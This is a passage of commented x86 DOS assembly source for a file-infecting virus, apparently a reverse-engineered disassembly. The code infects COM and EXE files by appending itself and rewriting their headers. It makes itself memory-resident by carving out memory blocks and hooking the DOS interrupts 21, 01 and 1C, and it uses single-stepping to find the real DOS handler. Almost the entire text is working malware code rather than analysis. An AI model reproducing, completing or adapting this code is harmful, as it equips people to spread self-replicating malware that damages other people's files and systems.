	MOV     BYTE PTR [COMFILE],01           ; CHECK IF FILE SIZE 
	CMP     WORD PTR [FSIZE1],+00           ; WILL ALLOW INFECTION
	JNZ     J5E1                            ;
	CMP     WORD PTR [FSIZE2],+20           ;
	JBE     J5E1                            ;
	CMP     WORD PTR [FSIZE2],0F277          ;
	JNB     J5E1                            ;

J5FF:   
	MOV     CX,WORD PTR [FSIZE1]            ; FIGURE END OF FILE
	MOV     DX,WORD PTR [FSIZE2]            ; +DATA NEEDED TO GET IT TO 
	ADD     DX,+0F                          ;A EVEN PAGE IE DIVISIBLE BY 10H
	ADC     CX,+00                          ;
	AND     DX,-10                          ;
	CALL    START_FILE                      ;

	XOR     DX,DX
	MOV     CX,0B41              ;OFFSET TOP_VIRUS -OFFSET BOT_VIRUS+1
	PUSH    word ptr [x7]
	MOV     BYTE PTR [x7],01
	CALL    WRITE_FILE
	POP     CX
	MOV     BYTE PTR [x7],CL
	JB      J5E1

	CMP     BYTE PTR [COMFILE],00
	JE      EXEINFEC                        ;J638

	MOV     CX,0004                         ; WRITES FIRST 4 BYTES
	CALL    WRITE_FILE                      ; TO END OF FILE

EXEINFEC:
	CALL    FORCE_WRITE                     ; FA 7A 2C 00

	JB      J5E1

	MOV     DX,WORD PTR [FSIZE1]
	MOV     AX,[FSIZE2]
	ADD     AX,000F
	ADC     DX,+00
	AND     AX,0FFF0
	DIV     WORD PTR [PAGE_16]
	MOV     WORD PTR[CHECKSUM],AX
	CMP     BYTE PTR [COMFILE],00
	JE      EXEONLY
;DO THIS TO COM FILE ONLY
	MUL     WORD PTR [PAGE_16]
	MOV     BYTE PTR [TOP_HOST],0E9
	ADD     AX,07CE
	MOV     [TOP_HOST+1],AX
	JMP     SHORT J069E

EXEONLY:                                        ;66C
	MOV     [I_CS],AX
	MOV     WORD PTR [I_IP],07D1            ;OFFSET START          
	MUL     WORD PTR [PAGE_16]       
	ADD     AX,OFFSET VGROUP:BOT_VIR        ;B40
	ADC     DX,+00
	DIV     WORD PTR [EXE_PG_SIZE]
	INC     AX
	MOV     WORD PTR [P_COUNT],AX
	MOV     WORD PTR [P_SIZE],DX
	MOV     AX,WORD PTR [H_PARA]
	SUB     WORD PTR [I_CS],AX

;J692:       SET MIN_MALLOC

	MOV     SI,OFFSET MINALLOC
	CALL    P_MIN_MAX_ALLOC

	MOV     SI,OFFSET MAXALLOC      
	CALL    P_MIN_MAX_ALLOC

J069E:  XOR     CX,CX
	MOV     DX,CX
	CALL    START_FILE

	MOV     DX,OFFSET TOP_HOST
	MOV     CX,20
	CALL    WRITE_FILE

CLOSE_EXITVIR:                                          ;J6AE
	PUSH    [BP+0E]
	PUSH    [BP+06]
	CALL    CLOSE_F

;J6B7
	ADD     SP,+04                          ;REMOVE LAST 2 PUSH
LEAVE_:
	MOV     BYTE PTR [INFEC_FL],0FF
	POP     AX
	POP     BX
	POP     CX
	POP     DX
	POP     SI
	POP     DI
	POP     BP
	POP     DS
	POP     ES
	POPF

GOTO_INT21:                                             ;J6C9
	PUSHF
	PUSH    CS                                      ; FLAG   <- BP +6
	PUSH    WORD PTR CS:[C_OFFSET_21]                  ; CS     <- BP +4
	CMP     BYTE PTR CS:[REM2],00                  ; IP     <- BP +2
	JNE     J6D9                                    ; OLDBP  <- BP    =SP
	IRET                                            ;
J6D9:   PUSH    BP
	MOV     BP,SP
	OR      WORD PTR [BP+06],0100                   ;SETS TRAP FLAG ON
							;RETURN
	MOV     BYTE PTR CS:[REM2],00
	POP     BP
	IRET    
VIR_INT_21      ENDP

					 ;       C
OPEN_FILE       PROC                     ;       A
	PUSH    BP                       ; FLAG  8
	MOV     BP,SP                    ; CS    6
	PUSH    ES                       ; IP    4 
	PUSH    DX                       ; BP    2
	PUSH    CX                  ;BP->
	PUSH    BX
	PUSH    AX

	MOV     AX,3300                         ;GET EXT CTRL-BREAK
	CALL    C2_INT21                        ;P361
	MOV     BYTE PTR [CTRL_FLAG],DL         ;SAVE OLD SETTING
	
	MOV     AX,3301                         ;SET CTRL-BREAK    
	XOR     DL,DL                           ;OFF
	CALL    C2_INT21
						
	MOV     AX,3524                         ;GET INT 24 
	CALL    C2_INT21                        ;VECTORS
	MOV     WORD PTR [OLD_INT24_SEG],ES     ;SAVE THEM HERE
	MOV     WORD PTR [OLD_INT24_OFS],BX     ;

	MOV     DX,OFFSET VIR_INT24             ;J384
	MOV     AX,2524                         ;SET INT 24
	CALL    C2_INT21                        ;TO OUR HANDLER

	MOV     AX,4300                         ;GET THE FILE ATTRIBUTES
	PUSH    DS                              ;
	LDS     DX,[BP+04]                      ;PTR TO FILENAME
	CALL    C2_INT21                        ;
	POP     DS                              ;
	JB      GET_OUT_F_CL                    ;PROB_CH 
	MOV     BYTE PTR [F_ATTR],CL             ;
	
	TEST    CL,01                           ;TEST FOR R_W
	JZ      NOCHANGE_ATTR                   ; ITS R_W IF EQUAL
	MOV     AX,4301                         ;CHANGE F_ATTR        
	push    ds
	XOR     CX,CX                           ;
	LDS     DX,[BP+04]                      ;
	CALL    C2_INT21                        ;
	POP     DS                              ;
PROB_CH: 
	JB      GET_OUT_F_CL                            ;

NOCHANGE_ATTR:  
	MOV     AX,3D02                         ;OPEN FILE R_W
	PUSH    DS                              ;
	LDS     DX,[BP+04]                      ;FNAME PTR        
	CALL    C2_INT21
	POP     DS
	JB      J0780
;J74C
	MOV     WORD PTR [F_HANDLE],AX          ;
	MOV     AX,5700                         ;GET FILE TIME DATE
	CALL    I21_F_HANDLE                    ;
	MOV     WORD PTR [F_TIME],CX            
	MOV     WORD PTR [F_DATE],DX
	
	POP     AX
	POP     BX
	POP     CX
	POP     DX
	POP     ES
	POP     BP
	CLC                                             
	RET
OPEN_FILE       ENDP                            ;764

CLOSE_F         PROC
	PUSH    BP
	MOV     BP,SP
	PUSH    ES
	PUSH    DX
	PUSH    CX
	PUSH    BX
	PUSH    AX

	MOV     CX,WORD PTR [F_TIME]            ; RESTORE
	MOV     DX,WORD PTR [F_DATE]           ; TIME AND DATE
	MOV     AX,5701                         ; TO FILE
	CALL    I21_F_HANDLE

	MOV     AH,3E
	CALL    I21_F_HANDLE                    ;******************

J0780:  MOV     CL,BYTE PTR [F_ATTR]
	XOR     CL,20
	AND     CL,3F
	TEST    CL,21
	JZ      GET_OUT_F_CL                    ;J7A0

	MOV     AX,4301
	PUSH    DS
	XOR     CH,CH
	MOV     CL,BYTE PTR [F_ATTR]
	LDS     DX,[BP+04]                      ;ASCIZ FILENAME
	CALL    C2_INT21                        ;J361*************        
	POP     DS             

GET_OUT_F_CL:        
	MOV     AX,2524
	PUSH    DS
	LDS     DX,DWORD PTR [OLD_INT24_OFS]
	CALL    C2_INT21
	POP     DS

	MOV     DL,BYTE PTR [CTRL_FLAG]
	MOV     AX,3301
	CALL    C2_INT21

	POP     AX
	POP     BX
	POP     CX
	POP     DX
	POP     ES
	POP     BP
	STC
	RET
CLOSE_F         ENDP

RET_HOST        PROC
	POP     CX
	MOV     DX,0200
	CMP     BYTE PTR CS:[BX+REM2],00
	JE      J7CC
	MOV     DH,03
	
J7CC:   PUSH    DX
	PUSH    CS
	PUSH    CX
	INC     BX
	IRET
RET_HOST        ENDP

;07d1
START:  
	CALL    FIND_OFFSET

FIND_OFFSET:     
	POP     BX     
	SUB     BX,OFFSET FIND_OFFSET

	MOV     BYTE PTR CS:[BX+INFEC_FL],0FF               ;D005C
	CLD
	CMP     BYTE PTR CS:[BX+COMFILE],00
	JE      EXEFILE                                 ;J800

;ONLY OCCURS IF IT IS A COM FILE
	MOV     SI,OFFSET TOP_HOST              ;MOV 20H BYTES FROM
	ADD     SI,BX                           ;  [SI] TO
	MOV     DI,0100                         ;  [DI]
	MOV     CX,0020                         ;           
	REPZ    MOVSB
	
	PUSH    CS
	PUSH    WORD PTR CS:[BX+HOST_IP]
	
	PUSH    ES
	PUSH    DS
	PUSH    AX
	JMP     short INSTALLED?

EXEFILE:
;NOTICE NO BX+ OFFSET NEEDED BECAUSE IT ASSUMES IT IS EXE AT THIS
;MOMENT
	MOV     DX,DS
	ADD     DX,+10
	ADD     DX,WORD PTR CS:[I_CS]
	PUSH    DX

	PUSH    word ptr cs:[I_IP]
	
	PUSH    ES
	PUSH    DS
	PUSH    AX

INSTALLED?:
	PUSH    BX
	MOV     BX,002C
	CLC
	MOV     AX,0C603
	INT     21
	POP     BX
	JNB     NOT_INSTALLED                   ;J0827

EXIT:   
	POP     AX
	POP     DS
	POP     ES
	CALL    RET_HOST                        ;P_07BE
	RETF
;J0827
NOT_INSTALLED:                                   

	CMP     BYTE PTR cs:[BX+COMFILE],00
	JE      FILE_IS_EXE                     ;J0834
	CMP     SP,-10
	JB      EXIT                            ;J0820

FILE_IS_EXE:                                    
	MOV     AX,DS                           ;LOOK AT MCB
	DEC     AX                              ;
	MOV     ES,AX                           ;
	CMP     BYTE PTR ES:[0000],5A              ; IS IT Z
	JE      LAST_MEM_BLOCK                  ;YES IT IS LAST ONE

	PUSH    BX
	MOV     AH,48                   ;REQUEST A BLOCK OF MEM
	MOV     BX,0FFFF                 ;LARGEST AVAILABLE
	INT     21

	CMP     BX,00BC                 ;IS BLOCK > BC
	JB      TO_SMALL                 ;J0853

	MOV     AH,48                   ;AVAIBLE BLOCK IS BIG ENOUGH
	INT     21                      ; GET IT IN AX

TO_SMALL:
	POP     BX
	JB      EXIT

	DEC     AX                      ;GET MCB SEGMENT IN ES
	MOV     ES,AX                   ;            
	CLI     
	MOV     WORD PTR ES:[0001],0000 ;MARK THIS BLOCK AS FREE
	CMP     BYTE PTR ES:[0000],5A   ; IS LAST MCB       
	JNE     EXIT

	ADD     AX,WORD PTR ES:[0003]   ;SIZE OF MEM MCB CONTROLS
	INC     AX                      ;
	MOV     WORD PTR ES:[0012],AX   ;0012 PTS TO NEXT MCB 

LAST_MEM_BLOCK:
	MOV     AX,WORD PTR ES:[0003]   ;SIZE OF MEM
	SUB     AX,00BC                 ;MINUS SIZE VIRUS/10H
	JB      EXIT                    ;
	
	MOV     WORD PTR ES:[0003],AX
	SUB     WORD PTR ES:[0012],00BC       
	MOV     ES,ES:[0012]            ;SEG TO LOAD VIRUS INTO
	XOR     DI,DI                   ;MOV  B40 BYTES  FROM
	MOV     SI,BX                   ; DS:[SI]
					; TO ES:[DI]
	MOV     CX,OFFSET VGROUP:BOT_VIR ;0B40

	DB      0F3, 2E,0A4
;       REPZ    CS: MOVSB                               ;
	
	PUSH    ES
	POP     DS
	PUSH    BX

;J0899   
;NOTE THAT DS:= ES MEANS LOCATION IN HIGH MEM BELOW 640
;SO THAT IF CS IS REFRENCED YOU MUST STILL USE OFFSET
;BUT IF DS IS USED OFFSET CAN NOT BE USED

	MOV     AX,3521
	INT     21
	MOV     [OLD_INT21_SEG],ES
	MOV     [OLD_INT21_OFS],BX

	MOV     [OLD_INT21_SEG2],ES
	MOV     [OLD_INT21_OFS2],BX
	
	MOV     AX,3501                                 ;GET VECTOR FOR
	INT     21                                      ;INTERUPT 01
	MOV     SI,BX                                   ;SAVE IN REGS
	MOV     DI,ES                                   ;DS:SI

	MOV     AX,351C
	INT     21
	MOV     [OLD_INT1C_SEG],ES
	MOV     [OLD_INT1C_OFS],BX
	
	POP     BX

	MOV     AX,2521
	MOV     DX,OFFSET VIR_INT_21
	INT     21

	MOV     AX,2501
	MOV     DX,OFFSET VIR_INT_01
	INT     21

	MOV     DX,OFFSET VIR_INT_1C
	
	PUSHF
	MOV     AX,BX                           ;PUT OFFSET IN AX
	ADD     AX,OFFSET VACSINE               ;SET UP TO GO HERE
	PUSH    CS                              ;USING STACK
	
	PUSH    AX                              ;SAVE OFFSET        
	
	CLI                                     ;CLEAR INTER FLAGS        
	PUSHF                                   ;PUSH FLAGS
	POP     AX                              ;POP FLAG
	OR      AX,0100                         ;SET TF 
	PUSH    AX                              ;FOR SINGLE STEP

	MOV     AX,BX
	ADD     AX,OFFSET REAL_INT21            ;FLAGS SET FOR SINGLE STEP
	PUSH    CS                              ;CS
	PUSH    AX                              ;IP TO REAL_INT21
	MOV     AX,251C                         ;WHEN INT 21 CALLED
						;HOOK 1C
	MOV     BYTE PTR [SNARE],01
	IRET

VIR_INT_01      PROC
	PUSH    BP
	MOV     BP,SP
	CMP     BYTE PTR CS:[SNARE],01              ;IF SNARE IS SET
	JE      YES_NO                               ;CONTINUE

EXIT_VIR_INT01:
	AND     WORD PTR [BP+06],0FEFF                   ;CLEAR TF
	MOV     BYTE PTR cs:[SNARE],00                     ;CLEAR SNARE        
	POP     BP                                      ;
	IRET                                            ;

YES_NO:  CMP     WORD PTR [BP+04],0300                  ; 
	JB      GOT_IT                                  ;J0918
	POP     BP                                      ;NOPE       
	IRET                                            ;TRY AGAIN

GOT_IT:
	PUSH    BX
	MOV     BX,[BP+02]
	MOV     WORD PTR CS:[OLD_INT21_OFS2],BX
	MOV     BX,[BP+04]
	MOV     WORD PTR CS:[OLD_INT21_SEG2],BX
	POP     BX
	JMP     EXIT_VIR_INT01

VIR_INT_01       ENDP

VACSINE:
	MOV     BYTE PTR [SNARE],00

	MOV     AX,2501                         ;RESTORE
	MOV     DX,SI                           ;INT 01
	MOV     DS,DI                           ;
	INT     21                              ;
						
;NEXT PIECE OF CODE IS LOOKING AT DS:=0000
;0000:00C5 MIGHT BE A JUMP TO AN INT BEING ALTERED AT TABLE
;0000:00C7   
;0000:0413 MEM SIZE IN KILOBYTES

	XOR     AX,AX
	MOV     DS,AX
	MOV     WORD PTR DS:[00C5],397F
	MOV     BYTE PTR DS:[00C7],2C
	MOV     AX,WORD PTR DS:[MEM_SIZE]
	MOV     CL,06
	SHL     AX,CL
	MOV     DS,AX
	MOV     SI,012E
	XOR     AX,AX
	MOV     CX,0061

L1:     ADD     AX,[SI]
	ADD     SI,+02
	LOOP    L1

	CMP     AX,053BH
	JE      PING_IN_MEM                             ;J0969
	JMP     EXIT                                    ;J0820

PING_IN_MEM:
	CLI
	MOV     BYTE PTR DS:[017AH],01H
	MOV     BYTE PTR DS:[01FBH],01H
	MOV     BYTE PTR DS:[0093H],0E9H
	MOV     WORD PTR DS:[0094H],0341H
	
	PUSH    DS 
	POP     ES
	
	PUSH    CS
	POP     DS
	
	MOV     SI,BX                           ;STILL = OFFSET
	ADD     SI,OFFSET NEW_PONG
	MOV     DI,03D7
	MOV     CX,0027
	REPZ    MOVSB
	STI
	JMP     EXIT

P_0995  PROC
;CALLED BY P_09C8
;
	PUSH    BP
	MOV     BP,SP
	PUSH    CX
	MOV     AX,8000
	XOR     CX,CX

PLOOP:
	TEST    AX,[BP+08]
	JNE     J09A8
	INC     CX
	SHR     AX,1
	JMP     short PLOOP
J09A8:
	XOR     AX,[BP+08]
	JE      J09BC

	MOV     AX,[BP+04]
	ADD     AX,[BP+08]
	ADD     AX,CX
	SUB     AX,0011
	CLC
	POP     CX
	POP     BP
	RET
J09BC:        
	MOV             AX,000F
	SUB     AX,CX
	ADD     AX,[BP+06]
	STC
	POP     CX
	POP     BP
	RET
P_0995          ENDP
;********************************************************************

P_09C8          PROC
;CALLED BY P_02D8
	PUSH    BP    
	MOV     BP,SP
	SUB     SP,+10                  ;ADD BACK SP 5 WORDS

	MOV     DX,8000
L21:     TEST    DX,[BP+08]
	JNZ     J09DA
	SHR     DX,1
	JMP     L21

J09DA:        
	LEA     DI,[BP-10]              ;
	MOV     CX,0008                 ;
	XOR     AX,AX                   ;
	PUSH    SS                      ;SS = ES
	POP     ES                      ;
	REPZ    STOSW                   ;MOV     8 WORDS FROM
					;MOV    DS:SI
					;TO     ES:DI
	MOV     CX,[BP+08]

J09E9:  TEST    CX,DX
	JE      J0A4B

	PUSH    CX
	PUSH    [BP+06]
	PUSH    [BP+04]
	CALL    P_0995

	MOV     ES,AX
	LAHF
	ADD     SP,+06
	SAHF
	JB      J0A3A

;0A00
	MOV     AX,WORD PTR ES:[0000]           ;
	XOR     [BP-10],AX                      ;
						;
	MOV     AX,WORD PTR ES:[0002]           ;
	XOR     [BP-0E],AX                      ;
						;
	MOV     AX,WORD PTR ES:[0004]           ;
	XOR     [BP-0C],AX                      ;
						;
	MOV     AX,WORD PTR ES:[0006]           ;
	XOR     [BP-0A],AX                      ;
						;
	MOV     AX,WORD PTR ES:[0008]           ;
	XOR     [BP-08],AX                      ;
						;
	MOV     AX,WORD PTR ES:[000A]           ;
	XOR     [BP-06],AX                      ;
						;
	MOV     AX,WORD PTR ES:[000C]           ;
	XOR     [BP-04],AX                      ;
						;                        
	MOV     AX,WORD PTR ES:[000E]           ;
	XOR     [BP-02],AX                      ;
						;
	JMP     SHORT J0A4B

J0A3A:
	MOV     AX,CX
	MOV     CX,0008
	LEA     SI,[BP-10]
	XOR     DI,DI
	
	DB      0F3,36,0A5
;        REPZ    SS:MOVSW
	
	MOV     CX,AX
	JMP     SHORT J0A4E

J0A4B:
	DEC     CX
	JMP     SHORT J09E9

J0A4E:  
	SHR     DX,1
	JB      J0A54
	JMP     SHORT J09DA

J0A54:
	MOV     SP,BP
	POP     BP
	RET
P_09C8  ENDP

;*****************************************************************

P_0A58  PROC
	PUSH    BP
	MOV     BP,SP
	PUSH    DS
	
J0A5C:  
	MOV     DS,[BP+04]
	MOV     ES,[BP+06]
	XOR     BX,BX
	
J0A64:        
	MOV     AX,WORD PTR ES:[BX]
	XOR     WORD PTR [BX],AX
	ADD     BX,+02
	CMP     BX,+10
	JB      J0A64
	INC     WORD PTR [BP+04]
	INC     WORD PTR [BP+06]
	DEC     WORD PTR [BP+08]
	JNZ     J0A5C

	POP     DS
	POP     BP
	RET
P_0A58  ENDP
;************************************************************

P_0A7F  PROC
	PUSH    BP
	MOV     BP,SP
	PUSH    DS
	MOV     BL,01
J0A85:
	XOR     SI,SI
J0A87:        
	XOR     CX,CX
	MOV     DI,[BP+08]
	ADD     DI,[BP+0A]
	DEC     DI

J0A90:        
	MOV     DS,DI
	SHR     BYTE PTR [SI],1
	RCL     CX,1
	DEC     DI
	CMP     DI,[BP+08]
	JNB     J0A90
	OR      CX,CX
	JZ      J0AB1

	PUSH    CX
	PUSH    [BP+06]
	PUSH    [BP+04]
	CALL    P_0995

	ADD     SP,+06                          ;
	MOV     DS,AX
	XOR     BYTE PTR [SI],BL
J0AB1:        
	INC     SI
	CMP     SI,+10
	JB      J0A87
	SHL     BL,01
	JNB     J0A85
	POP     DS
	POP     BP
	RET
P_0A7F  ENDP

J0ABE   DB      87,0DBH
;J0AC0  DB      88,CB                           ;VALUE MAYBE USED AS 0ACO


J0AC0:          DB        88,0CBH,8A,99,8F,38
		DB        0E7H,0CDH,0A1H,9BH,3EH
		DB        0EF,86,0C8,97,83,52
		DB        34,0BE,8C,21, 29,0B1
		DB        0F9H,0C1H,9BH,12H,04H,09H,0F3H
		DB        45, 01, 93, 01DH, 0B0      
		DB        0B9,0C6,01,06,92,37,50            
		DB        49,0E8,0D5,71,97            
		DB        22,0A6,0E6,04C,50            
		DB        0BE,2A,23        
		DB        0BE,44, 01DH        
		DB        0A1,0A6,6BH
		DB        0A0,0E0,06        
		DB        0AA,1A,0F6,2A,0C0          
		DB        02,2F,75,99          
		DB        06H,0FH,5BH,97H,02H,3EH
		DB        64, 07DH, 0C8,50,66,08                
		DB        0C4,0FA,92,8E,64,75        
		DB        1BH, 0A6H, 1BH, 0B9H, 32H, 0BDH
		DB        0BH, 3EH, 61H, 06DH, 0E0H, 0C4H
		DB        0B9H, 29, 0CAH, 9CH, 17H, 08H, 21H
		DB        0EAH, 0EEH, 7EH , 85H, 0B1H
		DB        63H, 2AH, 0C3H, 71H, 71H, 2CH, 0A0H
		DB        0F2H, 8BH, 59H, 0DH
		DB        0F9,0D5H, 00H
;POSSIBLE END OF VIRUS                        


BOT_VIR EQU     $       ;LABEL FOR END OF VIRUS
VIRUS_CODE      ENDS
	END start    





